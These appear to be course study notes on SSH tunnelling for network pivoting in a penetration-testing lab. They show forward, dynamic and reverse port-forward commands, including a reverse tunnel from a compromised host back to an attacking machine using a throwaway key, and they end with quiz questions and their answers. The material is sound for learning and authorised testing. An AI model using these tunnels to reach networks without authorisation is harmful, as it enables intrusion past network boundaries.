The first tool we'll be looking at is none other than the bog-standard SSH client with an OpenSSH server. Using these simple tools, it's possible to create both forward and reverse connections to make SSH "tunnels", allowing us to forward ports, and/or create proxies.

## Forward Connections

Creating a forward (or "local") SSH tunnel can be done from our attacking box when we have SSH access to the target. As such, this technique is much more commonly used against Unix hosts. Linux servers, in particular, commonly have SSH active and open. That said, Microsoft (relatively) recently brought out their own implementation of the OpenSSH server, native to Windows, so this technique may begin to get more popular in this regard if the feature were to gain more traction.

There are two ways to create a forward SSH tunnel using the SSH client -- port forwarding, and creating a proxy.

### Port forwarding

Port forwarding is accomplished with the `-L` switch, which creates a link to a **L**ocal port. For example, if we had SSH access to 172.16.0.5 and there's a webserver running on 172.16.0.10, we could use this command to create a link to the server on 172.16.0.10:  
`ssh -L 8000:172.16.0.10:80 user@172.16.0.5 -fN`  
We could then access the website on 172.16.0.10 (through 172.16.0.5) by navigating to port 8000 _on our own_ _attacking machine._ For example, by entering `localhost:8000` into a web browser. Using this technique we have effectively created a tunnel between port 80 on the target server, and port 8000 on our own box. Note that it's good practice to use a high port, out of the way, for the local connection. This means that the low ports are still open for their correct use (e.g. if we wanted to start our own webserver to serve an exploit to a target), and also means that we do not need to use `sudo` to create the connection. The `-fN` combined switch does two things: `-f` backgrounds the shell immediately so that we have our own terminal back. `-N` tells SSH that it doesn't need to execute any commands -- only set up the connection.

### Proxy

Proxies are made using the `-D` switch, for example: `-D 1337`. This will open up port 1337 on your attacking box as a proxy to send data through into the protected network. This is useful when combined with a tool such as proxychains. An example of this command would be:  
`ssh -D 1337 user@172.16.0.5 -fN`  

This again uses the `-fN` switches to background the shell. The choice of port 1337 is completely arbitrary -- all that matters is that the port is available and correctly set up in your proxychains (or equivalent) configuration file. Having this proxy set up would allow us to route all of our traffic through into the target network.

---

## Reverse Connections

Reverse connections are very possible with the SSH client (and indeed may be preferable if you have a shell on the compromised server, but not SSH access). They are, however, riskier as you inherently must access your attacking machine _from_ the target -- be it by using credentials, or preferably a key based system. Before we can make a reverse connection safely, there are a few steps we need to take:

1. First, generate a new set of SSH keys and store them somewhere safe (`ssh-keygen`):
	![[SSH Tunnelling  - Port Forwarding-20241206144525160.webp]]
	This will create two new files: a private key, and a public key.

2. Copy the contents of the public key (the file ending with `.pub`), then edit the `~/.ssh/authorized_keys` file on your own attacking machine. You may need to create the `~/.ssh` directory and `authorized_keys` file first.

3. On a new line, type the following line, then paste in the public key:  
    `command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-x11-forwarding,no-pty`  
    This makes sure that the key can only be used for port forwarding, disallowing the ability to gain a shell on your attacking machine.
	The final entry in the `authorized_keys` file should look something like this:
	![[SSH Tunnelling  - Port Forwarding-20241206144824201.webp]]

4. Next. check if the SSH server on your attacking machine is running:  
	`sudo systemctl status ssh`
		If the service is running then you should get a response that looks like this (with "active" shown in the message):
		![[SSH Tunnelling  - Port Forwarding-20241206144943302.webp]]
		If the status command indicates that the server is not running then you can start the ssh service with:  
		`sudo systemctl start ssh`

5. The only thing left is to do the unthinkable: transfer the private key to the target box. This is usually an absolute no-no, which is why we generated a throwaway set of SSH keys to be discarded as soon as the engagement is over.
7. With the key transferred, we can then connect back with a reverse port forward using the following command:  
	`ssh -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -fN   `

To put that into the context of our fictitious IPs: 172.16.0.10 and 172.16.0.5, if we have a shell on 172.16.0.5 and want to give our attacking box (172.16.0.20) access to the webserver on 172.16.0.10, we could use this command on the 172.16.0.5 machine:  
`ssh -R 8000:172.16.0.10:80 kali@172.16.0.20 -i KEYFILE -fN   `

This would open up a port forward to our Kali box, allowing us to access the 172.16.0.10 webserver, in exactly the same way as with the forward connection we made before!

In newer versions of the SSH client, it is also possible to create a reverse proxy (the equivalent of the `-D` switch used in local connections). This may not work in older clients, but this command can be used to create a reverse proxy in clients which do support it:  
`ssh -R 1337 USERNAME@ATTACKING_IP -i KEYFILE -fN`  

This, again, will open up a proxy allowing us to redirect all of our traffic through localhost port 1337, into the target network.

> [!Note]
>_Modern Windows comes with an inbuilt SSH client available by default. This allows us to make use of this technique in Windows systems, even if there is not an SSH server running on the Windows system we're connecting back from. In many ways this makes the next task covering plink.exe redundant; however, it is still very relevant for older systems._


---
To close any of these connections, type `ps aux | grep ssh` into the terminal of the machine that created the connection:

![[SSH Tunnelling  - Port Forwarding-20241206145700214.webp]]

Find the process ID (PID) of the connection. In the above image this is 105238.

Finally, type `sudo kill PID` to close the connection:

![[SSH Tunnelling  - Port Forwarding-20241206145743341.webp]]


---
> [!question]
>1. If you're connecting to an SSH server _from_ your attacking machine to create a port forward, would this be a local (L) port forward or a remote (R) port forward?
>`L`
>2. Which switch combination can be used to background an SSH port forward or tunnel?
>`-fN`
>3. It's a good idea to enter our own password on the remote machine to set up a reverse proxy, Aye or Nay?
>`Nay`
>4. What command would you use to create a pair of throwaway SSH keys for a reverse connection?
>`ssh-keygen`
>5. If you wanted to set up a reverse portforward from port 22 of a remote machine (172.16.0.100) to port 2222 of your local machine (172.16.0.200), using a keyfile called `id_rsa` and backgrounding the shell, what command would you use? (Assume your username is "kali")
>`ssh -R 2222:172.16.0.100:22 kali@172.16.0.200 -i id_rsa -fN`
>6. What command would you use to set up a forward proxy on port 8000 to user@target.thm, backgrounding the shell?
>`ssh -D 8000 user@target.thm -fN`
>7. If you had SSH access to a server (172.16.0.50) with a webserver running internally on port 80 (i.e. only accessible to the server itself on 127.0.0.1:80), how would you forward it to port 8000 on your attacking machine? Assume the username is "user", and background the shell.
>`ssh -L 8000:127.0.0.1:80 user@172.16.0.50 -fN`

**Next step: ** [[plink.exe]]
